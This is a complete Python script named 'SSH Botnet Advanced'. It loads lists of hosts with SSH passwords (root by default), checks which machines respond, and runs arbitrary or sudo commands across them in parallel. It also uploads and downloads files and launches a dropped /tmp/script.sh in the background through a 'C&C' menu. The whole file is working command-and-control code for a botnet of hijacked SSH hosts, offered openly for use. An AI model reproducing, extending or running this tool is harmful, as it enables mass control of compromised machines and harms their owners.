#!/usr/bin/env python3
import sys
import os
import readline
import glob
import logging
from fabric import Connection, Config
from termcolor import colored
import threading
from concurrent.futures import ThreadPoolExecutor

# Silence Paramiko and Fabric loggers
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("fabric").setLevel(logging.CRITICAL)

# enable tab autocomplete (used for local path)
def complete(text, state):
    return (glob.glob(text+'*')+[None])[state]

readline.set_completer_delims(' \t\n;')
readline.set_completer(complete)
readline.parse_and_bind("tab: complete")

class SSHBotnet:
    def __init__(self):
        self.hosts = [] # List of dicts
        self.running_hosts = {} # ip: status/info
        self.processed_count = 0
        self.lock = threading.Lock()
        # Setup botnet logging
        logging.basicConfig(
            filename='botnet.log',
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger("botnet")
        self.logger.info("Botnet session started")

    def log(self, message):
        """Helper to print and log at the same time"""
        print(message)
        # Remove ANSI colors for the log file
        clean_msg = message.replace("\033[31m", "").replace("\033[32m", "").replace("\033[33m", "").replace("\033[34m", "").replace("\033[35m", "").replace("\033[36m", "").replace("\033[0m", "")
        self.logger.info(clean_msg)

    def load_hosts(self, filepath=None):
        if not filepath:
            readline.parse_and_bind("tab: complete")
            filepath = input("Enter path to hosts file: ").strip()
            
        if not os.path.exists(filepath):
            print(colored(f"Error: {filepath} not found.", "red"))
            return
        
        print(f"Loading hosts from {filepath}...")
        self.hosts = []
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                try:
                    if ',' in line:
                        parts = [p.strip() for p in line.split(',')]
                    else:
                        parts = line.split()
                    
                    host, user, port, password = None, 'root', 22, None

                    if len(parts) >= 2 and '@' in parts[0]:
                        # Format: user@host:port password
                        user_host_port = parts[0]
                        password = parts[1]
                        user, host_port = user_host_port.split('@', 1)
                        if ':' in host_port:
                            host, port_str = host_port.split(':', 1)
                            port = int(port_str)
                        else:
                            host = host_port
                    elif len(parts) >= 3:
                        # Format: host user password
                        host, user, port, password = parts[0], parts[1], 22, parts[2]
                    elif len(parts) == 1:
                        # Format: host
                        host, user, port, password = parts[0], 'root', 22, None
                    
                    if host:
                        self.hosts.append({'host': host, 'user': user, 'port': port, 'password': password})
                except:
                    pass
        
        self.log(colored(f"[*] Loaded {len(self.hosts)} hosts.", "green"))

    def run_on_host(self, host_info, command, sudo_cmd=False):
        try:
            # Config with short timeout for speed
            config = Config(overrides={'sudo': {'password': host_info['password']}, 'timeout': 2})
            with Connection(
                host=host_info['host'],
                user=host_info['user'],
                port=host_info['port'],
                connect_kwargs={"password": host_info['password'], "banner_timeout": 3, "auth_timeout": 3},
                config=config,
                connect_timeout=2
            ) as c:
                if sudo_cmd:
                    result = c.sudo(command, hide=True, warn=True)
                else:
                    result = c.run(command, hide=True, warn=True)
                return result.stdout.strip() if result.ok else f"Error: {result.stderr.strip()}"
        except:
            return "Host Down"

    def check_hosts(self):
        print(f"Checking {len(self.hosts)} hosts (this may take a while)...")
        self.running_hosts = {}
        self.processed_count = 0
        total = len(self.hosts)
        
        def check(h):
            res = self.run_on_host(h, "uname -a")
            with self.lock:
                self.running_hosts[h['host']] = res
                self.processed_count += 1
                if self.processed_count % 100 == 0 or self.processed_count == total:
                    sys.stdout.write(f"\rProgress: [{self.processed_count}/{total}] hosts checked...")
                    sys.stdout.flush()

        # Increase max_workers for speed, but keep it reasonable for system limits
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check, self.hosts)
        self.log(colored("\n[*] Host List Updated", "green"))

    def list_hosts(self):
        header = "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "SysInfo")
        print(header)
        print("-" * 70)
        for idx, h in enumerate(self.hosts):
            status = self.running_hosts.get(h['host'], "Unknown")
            print("{0:5} | {1:30} | {2}".format(idx, h['host'], status))
        print("\n")

    def save_hosts_report(self):
        filename = input("Enter filename for report [default: hosts_report.txt]: ").strip() or "hosts_report.txt"
        try:
            with open(filename, "w") as f:
                f.write("Host Report - " + os.uname().nodename + "\n")
                f.write("-" * 50 + "\n")
                for h in self.hosts:
                    status = self.running_hosts.get(h['host'], "Unknown")
                    f.write(f"Host: {h['host']} | User: {h['user']} | Status: {status}\n")
            self.log(colored(f"[*] Report saved to {filename}", "green"))
        except Exception as e:
            print(colored(f"Error saving report: {e}", "red"))

    def active_hosts(self):
        print("\nActive Hosts:")
        print(colored("ID\tHost\t\t\tStatus", "cyan"))
        print(colored("----\t---------------\t\t---------------------", "green"))
        flag = 0
        for idx, h in enumerate(self.hosts):
            status = self.running_hosts.get(h['host'], "Host Down")
            if status != "Host Down" and not status.startswith("Error"):
                uptime = self.run_on_host(h, "uptime")
                print(f"{idx}\t{h['host']}\t{uptime}")
                flag = 1
        if flag == 0:
            print(colored("No active hosts\n", "red"))
        print("\n")

    def get_selected_hosts(self):
        tmp = input("Hosts id (0 1 2... / all) [default is all]: ").strip()
        if tmp == "" or tmp == "all":
            return self.hosts
        try:
            indices = [int(i) for i in tmp.split()]
            return [self.hosts[i] for i in indices if i < len(self.hosts)]
        except:
            print(colored("Invalid input, using all hosts.", "yellow"))
            return self.hosts

    def run_command_menu(self):
        cmd = input("Command: ")
        selected = self.get_selected_hosts()
        self.logger.info(f"Executing command '{cmd}' on {len(selected)} hosts")
        
        def run_cmd(h):
            res = self.run_on_host(h, cmd, sudo_cmd=cmd.startswith("sudo"))
            output = f"\n[{h['host']}]: {cmd}\n{'-' * 40}\n{res}\n"
            print(output)
            self.logger.info(output.strip())

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(run_cmd, selected)

    def upload(self):
        local_path = input("Local path: ").strip()
        remote_path = input("Remote path: ").strip()
        selected = self.get_selected_hosts()
        
        def up(h):
            try:
                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                    remote_dir = os.path.dirname(remote_path)
                    if remote_dir:
                        c.run(f"mkdir -p {remote_dir}", hide=True)
                    c.put(local_path, remote=remote_path)
                    self.log(colored(f"[{h['host']}] Upload successful: {local_path} -> {remote_path}", "green"))
            except Exception as e:
                self.log(colored(f"[{h['host']}] Upload failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(up, selected)

    def download(self):
        remote_path = input("Remote path: ").strip()
        local_path = input("Local path: ").strip()
        selected = self.get_selected_hosts()
        
        def down(h):
            try:
                # Append hostname to local path to avoid overwriting
                l_path = f"{local_path}_{h['host']}" if not os.path.isdir(local_path) else os.path.join(local_path, f"{os.path.basename(remote_path)}_{h['host']}")
                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                    c.get(remote_path, local=l_path)
                    self.log(colored(f"[{h['host']}] Download successful: {remote_path} -> {l_path}", "green"))
            except Exception as e:
                self.log(colored(f"[{h['host']}] Download failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(down, selected)

    def script_exec(self):
        local_path = input("Local script path: ").strip()
        selected = self.get_selected_hosts()
        
        def exec_script(h):
            try:
                with Connection(h['host'], user=h['user'], port=h['port'], connect_kwargs={"password": h['password']}) as c:
                    c.put(local_path, remote="/tmp/script.sh")
                    c.run("chmod +x /tmp/script.sh", hide=True)
                    # Run in background similar to nohup
                    c.run("nohup /tmp/script.sh &> /dev/null &", pty=False)
                    self.log(colored(f"[{h['host']}] Script execution started: {local_path}", "green"))
            except Exception as e:
                self.log(colored(f"[{h['host']}] Script exec failed: {e}", "red"))

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(exec_script, selected)

def menu():
    options = ["List Hosts", "Active Hosts", "Update Hosts", "Run Command", "Open Shell (Not Implemented)", "File Upload", "File Download", "Script Exec", "Save Report", "Exit"]
    for num, desc in enumerate(options):
        print(f"[{num}] {desc}")
    try:
        choice = input('\nC&C $> ')
        return int(choice)
    except (KeyboardInterrupt, ValueError):
        return 9

def main():
    print(colored("--- SSH Botnet Advanced (Python 3) ---", "magenta", attrs=['bold']))
    
    botnet = SSHBotnet()
    botnet.load_hosts()
    botnet.check_hosts()
    
    while True:
        choice = menu()
        if choice == 0: botnet.list_hosts()
        elif choice == 1: botnet.active_hosts()
        elif choice == 2: botnet.check_hosts()
        elif choice == 3: botnet.run_command_menu()
        elif choice == 4: print(colored("Open Shell is tricky with Fabric 2 in a botnet script. Use 'Run Command' instead.", "yellow"))
        elif choice == 5: botnet.upload()
        elif choice == 6: botnet.download()
        elif choice == 7: botnet.script_exec()
        elif choice == 8: botnet.save_hosts_report()
        elif choice == 9: break
        else: print("Invalid choice")

if __name__ == "__main__":
    main()
